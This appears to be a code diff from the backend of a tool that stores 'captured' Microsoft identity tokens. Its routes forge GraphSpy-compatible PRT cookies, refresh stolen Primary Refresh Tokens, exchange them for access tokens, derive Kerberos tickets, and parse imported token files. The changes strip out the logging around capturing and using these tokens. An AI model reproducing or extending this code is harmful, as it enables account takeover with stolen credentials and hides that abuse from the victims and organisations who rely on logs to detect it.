@@ -293,8 +293,6 @@ router.get('/:id/cookie-script', userAuth, async (req, res) => {
       '})();'
     ].join('\n');
 
-    console.log('[Tokens] GraphSpy PRT cookie generated for token', token.id, 'tenant', materials.tenant);
-
     res.json({
       success: true,
       method: 'prt',
@@ -1166,7 +1164,6 @@ async function resolveRealPrt(token) {
       } catch (pErr) {
         console.error('[Tokens] Failed to persist self-healed PRT:', pErr.message);
       }
-      console.log('[Tokens] PRT self-heal: captured fresh PRT for token', token.id, 'tenant', tenant);
       return { prt: result.prt, refreshed: true, tenant };
     } catch (err) {
       console.warn('[Tokens] PRT self-heal failed for tenant', tenant, ':', err.message);
@@ -1220,13 +1217,8 @@ router.post('/:id/prt-capture', userAuth, async (req, res) => {
         // Fire-and-forget so the response is not delayed.
         if (tenant && tenant !== 'common' && tenant !== 'organizations') {
           kerberosService.deriveTGTForToken(token.id)
-            .then(r => {
-              if (r && r.success) console.log('[Tokens] Kerberos TGTs derived for token', token.id);
-              else console.log('[Tokens] Kerberos derivation skipped for token', token.id, ':', (r && r.error) || 'unknown');
-            })
             .catch(e => console.error('[Tokens] Kerberos derivation error:', e.message));
         }
-        console.log('[Tokens] PRT captured for token', token.id, 'tenant', tenant, '(session key stored redacted)');
         return res.json({
           success: true,
           tenant,
@@ -1278,7 +1270,6 @@ router.post('/:id/prt-cookie', userAuth, async (req, res) => {
     } catch (pErr) {
       console.error('[Tokens] Failed to persist KDF PRT cookie:', pErr.message);
     }
-    console.log('[Tokens] KDF PRT cookie generated for token', token.id, 'tenant', materials.tenant);
     res.json({ success: true, cookie, message: 'KDF-signed PRT cookie generated (GraphSpy-compatible).' });
   } catch (err) {
     console.error('[Tokens] prt-cookie error:', err.message);
@@ -1318,7 +1309,6 @@ router.post('/:id/prt-token', userAuth, async (req, res) => {
           'UPDATE captured_tokens SET prt = ? WHERE id = ? AND user_id = ?',
           [encrypt(result.refreshToken), token.id, token.user_id]
         );
-        console.log('[Tokens] Rotated PRT stored for token', token.id);
       } catch (pErr) {
         console.error('[Tokens] Failed to store rotated PRT:', pErr.message);
       }
@@ -1334,7 +1324,6 @@ router.post('/:id/prt-token', userAuth, async (req, res) => {
         console.error('[Tokens] Failed to store PRT access token:', pErr.message);
       }
     }
-    console.log('[Tokens] PRT->access token OK for token', token.id, 'tenant', materials.tenant, 'rotatedPrt=' + !!result.refreshToken);
     res.json({
       success: true,
       accessToken: result.accessToken,
@@ -1642,17 +1631,11 @@ async function importTokenFile(req, res) {
     const content = file.buffer.toString('utf8').trim();
     let tokenData;
 
-    console.log('[Tokens] File uploaded:', file.originalname, 'Size:', file.size, 'bytes');
-    console.log('[Tokens] Full content:', content.substring(0, 500));
-
     // Try to parse as JSON first
     if (file.mimetype === 'application/json' || file.name.endsWith('.json')) {
       try {
         tokenData = JSON.parse(content);
-        console.log('[Tokens] Parsed as JSON, type:', typeof tokenData, 'isArray:', Array.isArray(tokenData));
-        console.log('[Tokens] JSON keys:', typeof tokenData === 'object' ? Object.keys(tokenData) : 'N/A');
       } catch (e) {
-        console.log('[Tokens] JSON parse failed:', e.message);
         tokenData = parseAlternativeFormat(content);
       }
     } else {
@@ -1677,7 +1660,6 @@ async function importTokenFile(req, res) {
 
     // Handle array of tokens
     if (Array.isArray(tokenData)) {
-      console.log('[Tokens] Array of tokens:', tokenData.length);
       const results = [];
       for (const item of tokenData) {
         const result = await processImportedToken(req, item);
@@ -1698,28 +1680,22 @@ async function importTokenFile(req, res) {
 
     // Normalize the token data
     tokenData = normalizeTokenKeys(tokenData);
-    console.log('[Tokens] Normalized keys:', Object.keys(tokenData));
 
     // Try to find token in any field if not found in standard fields
     if (!tokenData.refresh_token && !tokenData.prt) {
-      console.log('[Tokens] No standard token field found, searching all fields...');
       for (const [key, value] of Object.entries(tokenData)) {
         const lowerKey = key.toLowerCase();
-        console.log('[Tokens] Checking field:', key, 'type:', typeof value, 'length:', typeof value === 'string' ? value.length : 'N/A');
         
         if (typeof value === 'string') {
           // Check if key contains token-related words
           if (lowerKey.includes('token') || lowerKey.includes('prt') || lowerKey.includes('refresh')) {
             if (lowerKey.includes('refresh') || lowerKey.includes('access')) {
               tokenData.refresh_token = value;
-              console.log('[Tokens] Found refresh_token in field:', key);
             } else if (lowerKey.includes('prt')) {
               tokenData.prt = value;
-              console.log('[Tokens] Found prt in field:', key);
             } else {
               // Assume it's a refresh token by default
               tokenData.refresh_token = value;
-              console.log('[Tokens] Found token in field:', key, '- assuming refresh_token');
             }
             break;
           }
@@ -1728,7 +1704,6 @@ async function importTokenFile(req, res) {
           if (value.length > 50 && !key.includes('email') && !key.includes('name')) {
             if (value.startsWith('0.AT') || value.startsWith('M.R') || value.length > 200) {
               tokenData.refresh_token = value;
-              console.log('[Tokens] Found long token value in field:', key);
               break;
             }
           }
@@ -1740,21 +1715,16 @@ async function importTokenFile(req, res) {
           if (nested.refresh_token || nested.prt) {
             if (nested.refresh_token) tokenData.refresh_token = nested.refresh_token;
             if (nested.prt) tokenData.prt = nested.prt;
-            console.log('[Tokens] Found token in nested object:', key);
             break;
           }
         }
       }
     }
 
-    console.log('[Tokens] Final token data keys:', Object.keys(tokenData));
-    console.log('[Tokens] Has refresh_token:', !!tokenData.refresh_token, 'Has prt:', !!tokenData.prt);
-    
     const result = await processImportedToken(req, tokenData);
     if (result.success) {
       res.json({ success: true, token_id: result.token_id, email: result.email, message: 'Token imported successfully' });
     } else {
-      console.log('[Tokens] Import failed:', result.error);
       res.status(400).json({ error: result.error, details: result.details });
     }
   } catch (err) {
@@ -1883,7 +1853,6 @@ async function processImportedToken(req, data) {
     // First, normalize the data keys
     const normalized = normalizeTokenKeys(data);
     
-    console.log('[Tokens] Processing normalized data:', Object.keys(normalized));
     
     // Validate required fields - check multiple possible field names
     const refreshToken = normalized.refresh_token || '';
@@ -1906,7 +1875,6 @@ async function processImportedToken(req, data) {
     const prtFinal = normalized.prt || '';
     
     if (!refreshTokenFinal && !prtFinal) {
-      console.log('[Tokens] No token found. Available keys:', Object.keys(normalized));
       return { 
         success: false, 
         error: 'Missing refresh_token or prt', 
